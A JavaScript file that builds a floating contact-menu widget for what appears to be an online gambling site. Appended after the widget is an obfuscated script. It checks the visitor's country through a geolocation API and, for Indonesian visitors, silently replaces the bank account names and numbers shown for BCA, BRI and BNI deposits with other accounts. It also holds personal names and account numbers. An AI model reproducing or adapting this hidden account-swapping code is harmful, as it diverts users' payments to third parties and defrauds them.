(function () {
    // Tunggu DOM siap
document.addEventListener('DOMContentLoaded', function () {
  // 1. Cari tombol LiveChat asli
  const originalButton = document.querySelector('div.livechat_button');

  // 2. Jika ditemukan, sembunyikan
  if (originalButton) {
    originalButton.style.display = 'none'; // atau originalButton.remove() jika ingin hapus total
  }

  // 3. Buat atau ambil elemen ikon chat kustom
  const customTrigger = document.getElementById('custom-chat-trigger');
  const chatUrl = 'https://www.livechat.com/?utm_source=chat_button&utm_medium=referral&utm_campaign=lc_19421850';

  // 4. Tambahkan event klik ke gambar
  if (customTrigger) {
    customTrigger.addEventListener('click', function (e) {
      e.preventDefault();
      // Buka di tab baru (gunakan '_blank')
      window.open(chatUrl, '_blank', 'noopener,noreferrer');
      
      // Atau, jika ingin buka di tab yang sama:
      // window.location.href = chatUrl;
    });
  }
});
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
.widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://yk69.top/gctele-official-yuk69" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Yuk69" width="30" height="30">
                    </div>
                </a>
                 <a href="https://yk69.top/anya" title="Asupan Yuk69">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/yuk69new.webp" alt="Asupan Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/tele-anya" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/RTP-Yuk69" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Yuk69" width="30" height="30">
                    </div>
                </a>
                <a href="https://yk69.top/official-fb-yuk69" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Yuk69" width="30" height="30">
                    </div>
                </a>
               
            </div>
        </div>
        <img src="https://yudha125.github.io/menu-widget/Image/yuk.webp" alt="Logo Yuk69" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Yuk69" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);
})();

(function (_0x0ca, _0x7b2f, _0x36g1cc) { _0x7b2f = "DI".split("").reverse().join(""); _0x0ca = 933109 ^ 933107; var _0x577e = (127742 ^ 127739) + (822311 ^ 822306); _0x36g1cc = "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F"; _0x577e = (148246 ^ 148245) + (411861 ^ 411861); function _0x47829a(_0x98e8b, _0xa715eg, _0x9d1cf) { _0x98e8b = "\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074"; const _0xcg892e = { "\u0042\u0043\u0041": { '\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069': "RIAN FRAN SISWANTO", '\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069': "6125-3045-28", '\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075': "LEVI", '\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075': "\u0032\u0031\u0032\u0030\u0034\u0035\u0032\u0030\u0030\u0035" }, "\u0042\u0052\u0049": { "targetNamaAsli": "\u0054\u004F\u004E\u0059", '\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069': "531701011612537", '\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075': "\u004C\u0055\u0053\u0049\u0041\u004E\u0041", "nomorBaru": "\u0030\u0033\u0034\u0035\u0030\u0031\u0030\u0035\u0030\u0032\u0031\u0031\u0035\u0030\u0036" }, "\u0042\u004E\u0049": { '\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069': "ANDIKA RICHI IRAWAN", "targetNomorAsli": "\u0031\u0039\u0039\u0030\u0036\u0033\u0032\u0035\u0034\u0037", '\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075': "\u0052\u0049\u0046\u0041\u004C", '\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075': "\u0031\u0037\u0039\u0036\u0033\u0037\u0037\u0031\u0033\u0033" } }; _0xa715eg = (565178 ^ 565171) + (741917 ^ 741915); function _0xe7410e(_0x_0xd33) { var _0xd0fefg = (264789 ^ 264788) + (315973 ^ 315980); const _0x77eb = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x98e8b); _0xd0fefg = (499621 ^ 499629) + (730087 ^ 730081); if (!_0x77eb) return; const _0xcea = _0x77eb['\u006F\u0070\u0074\u0069\u006F\u006E\u0073'][_0x77eb['\u0073\u0065\u006C\u0065\u0063\u0074\u0065\u0064\u0049\u006E\u0064\u0065\u0078']]['\u0074\u0065\u0078\u0074']['\u0074\u0072\u0069\u006D']()['\u0074\u006F\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065'](); _0x_0xd33 = 152191 ^ 152184; var _0x3089ef = (961712 ^ 961712) + (263953 ^ 263954); const _0x044c = _0xcg892e[_0xcea]; _0x3089ef = '\u0065\u006D\u0063\u006B\u0068\u006E'; if (!_0x044c) return; var _0xbec = (637667 ^ 637664) + (908937 ^ 908937); const _0xe_0x122 = document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0073\u0070\u0061\u006E"); _0xbec = '\u0063\u0066\u006B\u006D\u006F\u006D'; _0xe_0x122['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](span => { if (span['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']() === _0x044c['\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069']) { span['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074'] = _0x044c['\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075']; } }); const _0x5f_0x336 = document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("vid".split("").reverse().join("")); _0x5f_0x336['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](div => { if (div['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']() === _0x044c['\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069']) { div['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074'] = _0x044c['\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075']; } }); } function _0xbbd72e() { const _0xf624ab = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x98e8b); if (!_0xf624ab) return false; _0xe7410e(); if (!_0xf624ab['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']) { _0xf624ab['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065", _0xe7410e); _0xf624ab['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064'] = "eurt".split("").reverse().join(""); } return !![]; } if (_0xbbd72e()) return; const _0xbb2c9b = new MutationObserver(() => { if (_0xbbd72e()) _0xbb2c9b['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074'](); }); _0x9d1cf = "hlkgcb".split("").reverse().join(""); _0xbb2c9b['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'], { "childList": !![], "subtree": !![] }); } async function _0x9b47ab() { try { const _0xd4385a = await fetch(_0x36g1cc); if (!_0xd4385a['\u006F\u006B']) throw new Error("rorrE IPA".split("").reverse().join("")); let _0x9e25a; const _0x90f = await _0xd4385a['\u006A\u0073\u006F\u006E'](); _0x9e25a = (483887 ^ 483881) + (750240 ^ 750248); const _0x92b = _0x90f['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065']; if (_0x92b === _0x7b2f) { _0x47829a(); } } catch (err) { } } _0x9b47ab(); })();
